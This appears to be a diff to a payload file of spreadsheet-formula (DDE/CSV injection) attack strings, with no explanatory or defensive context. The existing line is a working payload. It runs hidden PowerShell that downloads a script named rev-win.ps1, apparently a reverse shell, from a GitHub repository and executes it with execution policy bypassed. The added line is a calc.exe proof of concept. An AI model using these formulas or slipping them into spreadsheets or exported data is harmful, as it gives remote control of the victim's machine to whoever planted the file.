@@ -1,1 +1,4 @@
 =cmd|'/k powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/iqbalexploit/Resploit/master/rev-win.ps1\",\"coba.ps1\");powershell.exe -executionpolicy bypass -File coba.ps1'!'A1'
+
+
+=cmd|'/k calc.exe '!'A1'
